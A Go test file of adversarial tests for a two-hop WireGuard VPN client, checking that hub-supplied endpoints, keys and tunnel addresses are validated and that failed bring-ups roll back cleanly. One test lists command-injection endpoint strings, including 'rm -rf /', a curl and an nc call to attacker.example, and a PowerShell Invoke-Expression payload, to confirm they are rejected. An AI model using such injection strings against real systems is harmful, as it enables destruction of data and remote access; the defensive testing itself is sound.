package tunnel

import (
	"context"
	"errors"
	"strings"
	"sync"
	"testing"

	"github.com/Radi-Labs/ARFL/internal/app"
	"github.com/Radi-Labs/ARFL/pkg/protocol"
)

// Adversarial tests for the tunnel.
//
// Threat model (PASTA stage IV — threat analysis):
//
// The client learns about nodes from a hub and the hub is explicitly untrusted
// in ARFL's design. Every field in app.TunnelConfig therefore arrives from an
// attacker-controlled source: the hub chooses which nodes are offered, and each
// node self-reports its endpoint, WireGuard key and tunnel address. The tunnel
// package converts those values into privileged changes to the user's routing
// table, DNS resolver and network interfaces.
//
// That makes a malicious hub the primary adversary, a malicious single node
// operator the secondary one, and the abuse cases below the attacks worth
// defending against (PASTA stage V — attack modelling):
//
//	Spoofing        one operator secretly runs both hops, or points a hop at
//	                the victim's own machine or LAN.
//	Tampering       hop addresses crafted to seize more of the routing table
//	                than a single client address.
//	Repudiation     a teardown that silently half-fails while reporting success.
//	Info disclosure traffic, DNS queries or a stable identity escaping the
//	                tunnel to a party that should not see them.
//	DoS             a failed or partial bring-up leaving the machine offline.
//	EoP             hub-supplied strings reaching a shell or system command.
//
// The tests are named TestSTRIDE_<Category>_<Scenario> to match the convention
// in internal/payments/blind_stride_test.go.

// --- Spoofing ---

func TestSTRIDE_Spoofing_SameOperatorRunsBothHops(t *testing.T) {
	// The second hop exists so that no single party sees both the client's real
	// address and its destination. A hub that offers two endpoints backed by the
	// same WireGuard key silently collapses the tunnel to one hop while the UI
	// still shows two, which is worse than a single hop because the user
	// believes they are protected.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newReadyTunnel(t, fwg, fnet)

	cfg := validConfig()
	cfg.Exit.NodeWGPubkey = cfg.Entry.NodeWGPubkey

	err := tun.Up(context.Background(), cfg)
	if err == nil {
		t.Fatal("a shared WireGuard key across both hops must be rejected")
	}
	if !strings.Contains(err.Error(), "same operator") {
		t.Fatalf("error should explain the collapsed hop, got %q", err)
	}
	assertNothingApplied(t, fwg, fnet)
}

func TestSTRIDE_Spoofing_HopPointedAtTheClientItself(t *testing.T) {
	// A hop endpoint on loopback would make the client route its own traffic to
	// a local process. The pinning route added for the endpoint would also
	// redirect loopback traffic through the real gateway.
	for _, endpoint := range []string{
		"127.0.0.1:51820",
		"127.53.0.9:51820",
		"0.0.0.0:51820",
	} {
		fwg, fnet := newFakeWG(), newFakeNet()
		tun := newReadyTunnel(t, fwg, fnet)

		cfg := validConfig()
		cfg.Entry.Endpoint = endpoint

		if err := tun.Up(context.Background(), cfg); err == nil {
			t.Fatalf("endpoint %q must be rejected", endpoint)
		}
		assertNothingApplied(t, fwg, fnet)
	}
}

func TestSTRIDE_Spoofing_HopOnTheVictimsLAN(t *testing.T) {
	// A node on the user's own network cannot provide the network separation the
	// design depends on, and pinning a LAN address to the gateway can break
	// local connectivity. Link-local covers the cloud metadata range too.
	for _, endpoint := range []string{
		"192.168.1.50:51820",
		"10.0.0.5:51820",
		"172.16.4.4:51820",
		"169.254.169.254:51820",
	} {
		fwg, fnet := newFakeWG(), newFakeNet()
		tun := newReadyTunnel(t, fwg, fnet)

		cfg := validConfig()
		cfg.Exit.Endpoint = endpoint

		if err := tun.Up(context.Background(), cfg); err == nil {
			t.Fatalf("endpoint %q must be rejected", endpoint)
		}
		assertNothingApplied(t, fwg, fnet)
	}
}

// --- Tampering ---

func TestSTRIDE_Tampering_TunnelIPClaimsTheWholeInternet(t *testing.T) {
	// "0.0.0.0/0" is valid CIDR. Accepting it as an interface address would have
	// the tunnel interface claim every destination and blackhole the machine.
	for _, tunnelIP := range []string{
		"0.0.0.0/0",
		"10.0.0.2/1",
		"10.0.0.2/7",
	} {
		fwg, fnet := newFakeWG(), newFakeNet()
		tun := newReadyTunnel(t, fwg, fnet)

		cfg := validConfig()
		cfg.Entry.TunnelIP = tunnelIP

		if err := tun.Up(context.Background(), cfg); err == nil {
			t.Fatalf("tunnel IP %q must be rejected", tunnelIP)
		}
		assertNothingApplied(t, fwg, fnet)
	}
}

func TestSTRIDE_Tampering_PublicTunnelIP(t *testing.T) {
	// Tunnel addresses are private by construction. A public address assigned to
	// the interface would capture real internet traffic for that host — a hub
	// could use it to intercept a specific site.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newReadyTunnel(t, fwg, fnet)

	cfg := validConfig()
	cfg.Exit.TunnelIP = "8.8.8.8/32"

	if err := tun.Up(context.Background(), cfg); err == nil {
		t.Fatal("a public tunnel IP must be rejected")
	}
	assertNothingApplied(t, fwg, fnet)
}

// --- Repudiation ---

func TestSTRIDE_Repudiation_DownReportsPartialTeardown(t *testing.T) {
	// If Down reported success while routes survived, the user would believe
	// they were disconnected while traffic still flowed through paid nodes. The
	// error must name every failed step rather than the first one.
	fwg := newFakeWG()
	fnet := &brokenTeardownNet{fakeNet: newFakeNet()}
	tun := newReadyTunnel(t, fwg, fnet)

	if err := tun.Up(context.Background(), validConfig()); err != nil {
		t.Fatalf("up: %v", err)
	}

	err := tun.Down(context.Background())
	if err == nil {
		t.Fatal("Down must not report success when teardown failed")
	}
	if !strings.Contains(err.Error(), "restore DNS") {
		t.Fatalf("DNS failure must be reported, got %q", err)
	}
	if !strings.Contains(err.Error(), "delete route") {
		t.Fatalf("route failure must be reported, got %q", err)
	}

	// Reporting the failure is not enough — every other step must still have
	// been attempted, or one stuck route leaves the machine unusable.
	if len(fwg.deleted) != 2 {
		t.Fatalf("both interfaces should still be removed, got %v", fwg.deleted)
	}
}

// --- Information disclosure ---

func TestSTRIDE_InfoDisclosure_OuterHopCannotSeeGeneralTraffic(t *testing.T) {
	// The entry node must only carry the outer subnet and the exit node's
	// address. If its AllowedIPs were a default route, general traffic would be
	// handed to the entry node, which already knows the client's real IP — that
	// single mistake would deanonymise every session.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newReadyTunnel(t, fwg, fnet)

	if err := tun.Up(context.Background(), validConfig()); err != nil {
		t.Fatalf("up: %v", err)
	}

	outer := fwg.peers[OuterInterface]
	if len(outer) != 1 {
		t.Fatalf("expected one entry peer, got %d", len(outer))
	}
	for _, allowed := range outer[0].AllowedIPs {
		if allowed == "0.0.0.0/0" || allowed == "0.0.0.0/1" || allowed == "128.0.0.0/1" {
			t.Fatalf("entry peer must not carry general traffic, AllowedIPs = %v", outer[0].AllowedIPs)
		}
	}

	// Only the exit node's address should escape the outer subnet.
	want := map[string]bool{protocol.OuterTunnelSubnet: true, "198.51.100.20/32": true}
	for _, allowed := range outer[0].AllowedIPs {
		if !want[allowed] {
			t.Fatalf("unexpected AllowedIPs entry %q on the entry peer", allowed)
		}
	}
}

func TestSTRIDE_InfoDisclosure_DNSIsCapturedBeforeUpReturns(t *testing.T) {
	// If Up returned before DNS was redirected, the browser would resolve names
	// against the ISP's resolver while traffic flowed through the tunnel. That
	// leaks the full browsing history to the local network despite the VPN.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newReadyTunnel(t, fwg, fnet)

	if err := tun.Up(context.Background(), validConfig()); err != nil {
		t.Fatalf("up: %v", err)
	}
	if fnet.dnsSet != 1 {
		t.Fatalf("DNS should be redirected exactly once during bring-up, got %d", fnet.dnsSet)
	}
}

func TestSTRIDE_InfoDisclosure_PrivateKeyNeverLeaksIntoErrors(t *testing.T) {
	// Errors surface in the desktop UI and in logs users paste into bug reports.
	// A private key appearing there hands an attacker the session.
	fwg, fnet := newFakeWG(), newFakeNet()
	fwg.failOn = "peer:" + InnerInterface
	tun := newReadyTunnel(t, fwg, fnet)

	if _, err := tun.PublicKey(); err != nil {
		t.Fatalf("public key: %v", err)
	}
	priv := tun.keys.PrivateKey

	err := tun.Up(context.Background(), validConfig())
	if err == nil {
		t.Fatal("expected bring-up to fail")
	}
	if strings.Contains(err.Error(), priv) {
		t.Fatal("the private key must never appear in an error message")
	}
}

func TestSTRIDE_InfoDisclosure_NodesNeverSeeAStableIdentity(t *testing.T) {
	// Blind-signed tokens make payments unlinkable, but a WireGuard key reused
	// across sessions would re-link them anyway: a node seeing the same public
	// key twice knows it is the same customer. Each session must present a
	// fresh key.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newReadyTunnel(t, fwg, fnet)

	seen := map[string]bool{}
	for i := 0; i < 5; i++ {
		key, err := tun.PublicKey()
		if err != nil {
			t.Fatalf("public key: %v", err)
		}
		if seen[key] {
			t.Fatalf("session %d reused public key %q", i, key)
		}
		seen[key] = true

		if err := tun.Up(context.Background(), validConfig()); err != nil {
			t.Fatalf("up: %v", err)
		}
		if err := tun.Down(context.Background()); err != nil {
			t.Fatalf("down: %v", err)
		}
	}
}

// --- Denial of service ---

func TestSTRIDE_DoS_FailureAtEveryStepRestoresConnectivity(t *testing.T) {
	// The user is left with no internet if a failed bring-up abandons half a
	// routing table. Every failure point is exercised, because the rollback is
	// only correct if it holds no matter how far bring-up got.
	failures := []struct {
		name  string
		apply func(*fakeWG, *fakeNet)
	}{
		{"outer interface", func(w *fakeWG, _ *fakeNet) { w.failOn = "create:" + OuterInterface }},
		{"entry peer", func(w *fakeWG, _ *fakeNet) { w.failOn = "peer:" + OuterInterface }},
		{"entry pin route", func(_ *fakeWG, n *fakeNet) { n.failRoute = "203.0.113.10/32" }},
		{"exit route", func(_ *fakeWG, n *fakeNet) { n.failRoute = "198.51.100.20/32" }},
		{"inner interface", func(w *fakeWG, _ *fakeNet) { w.failOn = "create:" + InnerInterface }},
		{"exit peer", func(w *fakeWG, _ *fakeNet) { w.failOn = "peer:" + InnerInterface }},
		{"first half route", func(_ *fakeWG, n *fakeNet) { n.failRoute = "0.0.0.0/1" }},
		{"second half route", func(_ *fakeWG, n *fakeNet) { n.failRoute = "128.0.0.0/1" }},
		{"dns", func(_ *fakeWG, n *fakeNet) { n.setDNSErr = errors.New("resolver locked") }},
	}

	for _, f := range failures {
		t.Run(f.name, func(t *testing.T) {
			fwg, fnet := newFakeWG(), newFakeNet()
			f.apply(fwg, fnet)
			tun := newReadyTunnel(t, fwg, fnet)

			if err := tun.Up(context.Background(), validConfig()); err == nil {
				t.Fatal("expected bring-up to fail")
			}

			// Every route that was added must have been withdrawn, or the
			// machine keeps routing traffic into an interface that is gone.
			if len(fnet.added) != len(fnet.deleted) {
				t.Fatalf("added %d routes but deleted %d: %v vs %v",
					len(fnet.added), len(fnet.deleted), fnet.added, fnet.deleted)
			}
			for _, r := range fnet.added {
				if !containsRoute(fnet.deleted, r.cidr) {
					t.Fatalf("route %s was added but never removed", r.cidr)
				}
			}

			if len(fwg.created) != len(fwg.deleted) {
				t.Fatalf("created %v but deleted %v", fwg.created, fwg.deleted)
			}
			if fnet.dnsSet != fnet.dnsRestore {
				t.Fatalf("DNS set %d times, restored %d", fnet.dnsSet, fnet.dnsRestore)
			}

			// A failed attempt must leave the tunnel usable for a retry rather
			// than wedged in a half-up state.
			if tun.active != nil {
				t.Fatal("failed bring-up must not record an active session")
			}
			if err := tun.Down(context.Background()); err != nil {
				t.Fatalf("Down after a failed Up should be a no-op, got %v", err)
			}
		})
	}
}

func TestSTRIDE_DoS_ConcurrentUpEstablishesOneTunnel(t *testing.T) {
	// A user double-clicking Connect, or a UI firing a retry while the first
	// attempt is in flight, must not create two overlapping tunnels — the second
	// would overwrite the first's routes and the teardown state would no longer
	// describe the machine.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newReadyTunnel(t, fwg, fnet)

	var wg sync.WaitGroup
	results := make([]error, 8)
	for i := range results {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			results[i] = tun.Up(context.Background(), validConfig())
		}(i)
	}
	wg.Wait()

	succeeded := 0
	for _, err := range results {
		if err == nil {
			succeeded++
		}
	}
	if succeeded != 1 {
		t.Fatalf("exactly one Up should succeed, got %d", succeeded)
	}
	if len(fwg.created) != 2 {
		t.Fatalf("expected exactly 2 interfaces, got %d", len(fwg.created))
	}
}

func TestSTRIDE_DoS_ConcurrentDownTearsDownOnce(t *testing.T) {
	// Repeated Down calls must not delete the same route twice: on a real system
	// the second delete fails and would surface a spurious error, training users
	// to ignore teardown failures that matter.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newReadyTunnel(t, fwg, fnet)

	if err := tun.Up(context.Background(), validConfig()); err != nil {
		t.Fatalf("up: %v", err)
	}

	var wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if err := tun.Down(context.Background()); err != nil {
				t.Errorf("down: %v", err)
			}
		}()
	}
	wg.Wait()

	if fnet.dnsRestore != 1 {
		t.Fatalf("DNS should be restored exactly once, got %d", fnet.dnsRestore)
	}
	if len(fwg.deleted) != 2 {
		t.Fatalf("interfaces should be deleted exactly once, got %v", fwg.deleted)
	}
}

func TestSTRIDE_DoS_MissingGatewayAbortsBeforeTouchingAnything(t *testing.T) {
	// The default route is captured first precisely because it cannot be
	// recovered later. If it is unavailable, bring-up must abort before any
	// change — otherwise teardown has no gateway to restore traffic to.
	fwg, fnet := newFakeWG(), newFakeNet()
	fnet.routeErr = errors.New("no default route")
	tun := newReadyTunnel(t, fwg, fnet)

	if err := tun.Up(context.Background(), validConfig()); err == nil {
		t.Fatal("expected bring-up to abort")
	}
	assertNothingApplied(t, fwg, fnet)
}

// --- Elevation of privilege ---

func TestSTRIDE_EoP_HostileEndpointsCannotReachAShell(t *testing.T) {
	// Route commands run as root. Every attacker-controlled value that reaches
	// them passes through hostOf first, so hostOf is the chokepoint: it must
	// either reject the input or return a canonical numeric address with no
	// characters a shell or PowerShell could interpret. The Windows backend
	// interpolates these into script strings, so this is load-bearing.
	hostile := []string{
		"203.0.113.10; rm -rf /:51820",
		"$(curl attacker.example):51820",
		"`id`:51820",
		"203.0.113.10' -and (Invoke-Expression 'calc'):51820",
		"10.0.0.1|nc attacker.example 1234:51820",
		"..\\..\\windows\\system32:51820",
		"203.0.113.10\n0.0.0.0/0:51820",
	}

	for _, endpoint := range hostile {
		got, err := hostOf(endpoint)
		if err != nil {
			continue // rejected outright, which is the desired outcome
		}
		if strings.ContainsAny(got, ";|&$`'\"\n\r\\ ()<>") {
			t.Fatalf("hostOf(%q) returned %q, which contains shell metacharacters", endpoint, got)
		}
	}
}

func TestSTRIDE_EoP_ResolvedEndpointIsAlwaysCanonical(t *testing.T) {
	// Non-canonical spellings of an address can bypass string-based allowlists
	// downstream. hostOf must normalise or reject, never pass through.
	cases := map[string]string{
		"203.0.113.10:51820":       "203.0.113.10",
		"[::ffff:203.0.113.10]:51": "203.0.113.10",
	}
	for endpoint, want := range cases {
		got, err := hostOf(endpoint)
		if err != nil {
			t.Fatalf("hostOf(%q): %v", endpoint, err)
		}
		if got != want {
			t.Fatalf("hostOf(%q) = %q, want %q", endpoint, got, want)
		}
	}
}

// --- Poor usage / misuse ---

func TestMisuse_DownWithoutUpIsSafe(t *testing.T) {
	// A UI that calls Disconnect on startup, or after a crash recovery, must not
	// panic or issue delete commands for routes that were never added.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newTunnel(fwg, fnet)

	for i := 0; i < 3; i++ {
		if err := tun.Down(context.Background()); err != nil {
			t.Fatalf("Down on an idle tunnel should be a no-op, got %v", err)
		}
	}
	assertNothingApplied(t, fwg, fnet)
}

func TestMisuse_ConnectingBeforeGeneratingAKeyIsRejected(t *testing.T) {
	// Calling Up first would otherwise dereference a nil keypair. Failing with a
	// clear message is better than a panic that takes the desktop app down.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newTunnel(fwg, fnet)

	err := tun.Up(context.Background(), validConfig())
	if err == nil {
		t.Fatal("Up without a keypair must be rejected")
	}
	if !strings.Contains(err.Error(), "PublicKey") {
		t.Fatalf("error should tell the caller what to do, got %q", err)
	}
	assertNothingApplied(t, fwg, fnet)
}

func TestMisuse_EmptyAndPartialConfigsAreRejected(t *testing.T) {
	// Config assembled from a partially-loaded UI form, or from a hub response
	// missing fields, must fail validation rather than create a broken tunnel.
	cases := map[string]func(*app.TunnelConfig){
		"empty entry endpoint": func(c *app.TunnelConfig) { c.Entry.Endpoint = "" },
		"empty exit endpoint":  func(c *app.TunnelConfig) { c.Exit.Endpoint = "" },
		"empty entry key":      func(c *app.TunnelConfig) { c.Entry.NodeWGPubkey = "" },
		"empty exit key":       func(c *app.TunnelConfig) { c.Exit.NodeWGPubkey = "" },
		"empty entry IP":       func(c *app.TunnelConfig) { c.Entry.TunnelIP = "" },
		"empty exit IP":        func(c *app.TunnelConfig) { c.Exit.TunnelIP = "" },
		"malformed IP":         func(c *app.TunnelConfig) { c.Entry.TunnelIP = "not-an-ip" },
		"IP without mask":      func(c *app.TunnelConfig) { c.Exit.TunnelIP = "10.200.0.2" },
		"endpoint without port": func(c *app.TunnelConfig) {
			c.Entry.Endpoint = "203.0.113.10"
		},
		"identical endpoints": func(c *app.TunnelConfig) { c.Exit.Endpoint = c.Entry.Endpoint },
	}

	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			fwg, fnet := newFakeWG(), newFakeNet()
			tun := newReadyTunnel(t, fwg, fnet)

			cfg := validConfig()
			mutate(&cfg)

			if err := tun.Up(context.Background(), cfg); err == nil {
				t.Fatal("expected rejection")
			}
			assertNothingApplied(t, fwg, fnet)
		})
	}
}

func TestMisuse_ReconnectAfterFailureWorks(t *testing.T) {
	// A transient failure — node offline, route briefly locked — must leave the
	// tunnel reusable. If a failed attempt poisoned internal state, the user
	// would have to restart the app to retry.
	fwg, fnet := newFakeWG(), newFakeNet()
	fwg.failOn = "peer:" + InnerInterface
	tun := newReadyTunnel(t, fwg, fnet)

	if err := tun.Up(context.Background(), validConfig()); err == nil {
		t.Fatal("expected the first attempt to fail")
	}

	fwg.failOn = ""
	if err := tun.Up(context.Background(), validConfig()); err != nil {
		t.Fatalf("retry after a failed attempt should succeed, got %v", err)
	}
	if tun.active == nil {
		t.Fatal("retry should record an active session")
	}
}

func TestMisuse_CloseTearsDownAnActiveSession(t *testing.T) {
	// Users close the app while connected. If Close skipped teardown, the
	// machine would be left with a default route into an interface owned by a
	// process that no longer exists — no internet until reboot.
	fwg, fnet := newFakeWG(), newFakeNet()
	tun := newReadyTunnel(t, fwg, fnet)

	if err := tun.Up(context.Background(), validConfig()); err != nil {
		t.Fatalf("up: %v", err)
	}
	if err := tun.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	if len(fwg.deleted) != 2 {
		t.Fatalf("Close must remove both interfaces, got %v", fwg.deleted)
	}
	if fnet.dnsRestore != 1 {
		t.Fatalf("Close must restore DNS, got %d restores", fnet.dnsRestore)
	}
	if len(fnet.added) != len(fnet.deleted) {
		t.Fatalf("Close left %d routes behind", len(fnet.added)-len(fnet.deleted))
	}
}

// --- helpers ---

// brokenTeardownNet fails every teardown operation, to prove failures are
// reported rather than swallowed and that later steps still run.
type brokenTeardownNet struct {
	*fakeNet
}

func (b *brokenTeardownNet) DeleteRoute(cidr, gateway, iface string) error {
	b.fakeNet.DeleteRoute(cidr, gateway, iface)
	return errors.New("route is locked by another process")
}

func (b *brokenTeardownNet) RestoreDNS() error {
	b.fakeNet.RestoreDNS()
	return errors.New("resolver is managed by the system")
}

// assertNothingApplied verifies a rejected bring-up made no change at all. A
// validation failure that still mutated the routing table would be worse than
// no validation, because the user has no connected session to disconnect.
func assertNothingApplied(t *testing.T, w *fakeWG, n *fakeNet) {
	t.Helper()
	if len(w.created) != 0 {
		t.Fatalf("no interface should have been created, got %v", w.created)
	}
	if len(n.added) != 0 {
		t.Fatalf("no route should have been added, got %v", n.added)
	}
	if n.dnsSet != 0 {
		t.Fatalf("DNS should not have been touched, got %d changes", n.dnsSet)
	}
}

func containsRoute(routes []route, cidr string) bool {
	for _, r := range routes {
		if r.cidr == cidr {
			return true
		}
	}
	return false
}
